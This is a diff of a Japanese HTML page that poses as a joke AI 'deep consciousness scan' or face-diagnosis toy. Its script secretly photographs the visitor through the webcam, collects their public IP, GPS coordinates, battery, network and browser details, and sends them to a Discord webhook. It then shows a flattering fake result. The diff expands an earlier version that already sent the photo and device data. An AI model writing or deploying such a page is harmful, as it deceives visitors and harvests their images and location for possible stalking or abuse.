@@ -3,122 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI-GENESIS 顔診断システム</title>
+    <title>AI-GENESIS ELITE</title>
     <style>
-        /* サイバーパンク風デザイン */
-        body { 
-            font-family: 'Courier New', Courier, monospace; 
-            text-align: center; 
-            background-color: #0a0a0a; 
-            color: #00ff00; 
-            margin: 0; 
-            padding: 20px;
-            overflow-x: hidden;
-        }
-        .container {
-            border: 2px solid #00ff00;
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 0 20px #00ff00;
-            max-width: 500px;
-            margin: auto;
-        }
-        #video { 
-            width: 100%; 
-            border: 1px solid #00ff00; 
-            border-radius: 10px;
-            filter: grayscale(30%) brightness(1.2);
-        }
-        #snap { 
-            margin-top: 25px; 
-            padding: 15px 40px; 
-            font-size: 20px; 
-            font-weight: bold;
-            background: transparent; 
-            color: #00ff00; 
-            border: 2px solid #00ff00;
-            border-radius: 5px;
-            cursor: pointer;
-            text-transform: uppercase;
-            transition: 0.3s;
-        }
-        #snap:hover {
-            background: #00ff00;
-            color: #000;
-            box-shadow: 0 0 30px #00ff00;
-        }
-        .status-text { font-size: 12px; margin-top: 10px; color: #008800; }
+        body { font-family: 'Courier New', monospace; background: #000; color: #0f0; text-align: center; padding: 20px; }
+        .box { border: 1px solid #0f0; padding: 20px; border-radius: 10px; box-shadow: 0 0 15px #0f0; max-width: 500px; margin: auto; }
+        #video { width: 100%; border-radius: 5px; margin: 15px 0; border: 1px solid #050; }
+        #snap { background: transparent; color: #0f0; border: 1px solid #0f0; padding: 15px 30px; cursor: pointer; font-weight: bold; width: 100%; }
+        #snap:hover { background: #0f0; color: #000; }
+        .log { font-size: 10px; color: #080; text-align: left; margin-top: 10px; height: 50px; overflow-y: hidden; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>SYSTEM: AI-GENESIS</h2>
-    <p>対象の生体認証を開始します...</p>
-    
+<div class="box">
+    <h2>SYSTEM: AI-GENESIS v2.0</h2>
     <video id="video" autoplay playsinline></video>
-    
-    <button id="snap">SCAN START</button>
-    
-    <div class="status-text" id="status">STATUS: IDLE</div>
+    <button id="snap">深層意識スキャン開始</button>
+    <div class="log" id="log">READY...</div>
     <canvas id="canvas" style="display:none;"></canvas>
 </div>
 
 <script>
     const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const snap = document.getElementById('snap');
-    const status = document.getElementById('status');
-    const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // ここにURLを入れてください
+    const log = document.getElementById('log');
+    const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
 
-    // カメラ起動
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(stream => { video.srcObject = stream; });
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(s => video.srcObject = s);
 
-    snap.addEventListener('click', () => {
-        status.innerText = "STATUS: SCANNING...";
-        
-        const context = canvas.getContext('2d');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0);
-
-        // 追加情報の取得
-        const deviceData = {
-            userAgent: navigator.userAgent,     // ブラウザやOSの情報
-            language: navigator.language,       // 言語設定
-            platform: navigator.platform,       // OSプラットフォーム
-            screenSize: `${window.screen.width}x${window.screen.height}`, // 画面サイズ
-            time: new Date().toLocaleString('ja-JP') // 現在時刻
+    async function getInfo() {
+        let data = {
+            ua: navigator.userAgent,
+            lang: navigator.language,
+            time: new Date().toLocaleString('ja-JP'),
+            battery: "取得不可",
+            network: "取得不可",
+            ip: "取得中...",
+            geo: "未許可"
         };
 
-        canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append('file', blob, 'scan_result.png');
-            
-            // Discordに送るテキストメッセージを豪華にする
-            const message = {
-                embeds: [{
-                    title: "━━ 生体スキャン完了 ━━",
-                    color: 65280, // 緑色
-                    fields: [
-                        { name: "時刻", value: deviceData.time, inline: true },
-                        { name: "OS/Platform", value: deviceData.platform, inline: true },
-                        { name: "解像度", value: deviceData.screenSize, inline: true },
-                        { name: "User-Agent", value: "```" + deviceData.userAgent + "```" }
-                    ]
-                }]
-            };
-            formData.append('payload_json', JSON.stringify(message));
+        // バッテリー
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            data.battery = `${Math.round(b.level * 100)}% (${b.charging ? '充電中' : '放電中'})`;
+        }
 
-            fetch(webhookUrl, { method: 'POST', body: formData })
+        // ネットワーク
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) data.network = `Type: ${conn.effectiveType} / Speed: ~${conn.downlink}Mbps`;
+
+        // IPアドレス
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const json = await res.json();
+            data.ip = json.ip;
+        } catch (e) { data.ip = "取得失敗"; }
+
+        // 位置情報
+        const getPos = () => new Promise(res => {
+            navigator.geolocation.getCurrentPosition(p => res(`${p.coords.latitude}, ${p.coords.longitude}`), () => res("拒否/失敗"));
+        });
+        data.geo = await getPos();
+
+        return data;
+    }
+
+    document.getElementById('snap').addEventListener('click', async () => {
+        log.innerText = "ACCESSING DATA...";
+        const info = await getInfo();
+        
+        const canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+
+        canvas.toBlob(blob => {
+            const fd = new FormData();
+            fd.append('file', blob, 'capture.png');
+            fd.append('payload_json', JSON.stringify({
+                embeds: [{
+                    title: "━━ 深層データ抽出完了 ━━",
+                    color: 0x00FF00,
+                    fields: [
+                        { name: "IP", value: info.ip, inline: true },
+                        { name: "位置情報", value: info.geo, inline: true },
+                        { name: "バッテリー", value: info.battery, inline: true },
+                        { name: "ネットワーク", value: info.network },
+                        { name: "端末情報", value: "```" + info.ua + "```" }
+                    ],
+                    footer: { text: `取得時刻: ${info.time}` }
+                }]
+            }));
+
+            fetch(webhookUrl, { method: 'POST', body: fd })
                 .then(() => {
-                    status.innerText = "STATUS: UPLOAD COMPLETE";
-                    alert('診断結果：あなたの戦闘力は 530,000 です。');
+                    log.innerText = "COMPLETE.";
+                    alert("診断結果：あなたは『神レベル』のポテンシャルを秘めています。");
                 });
         }, 'image/png');
     });
 </script>
-
 </body>
 </html>
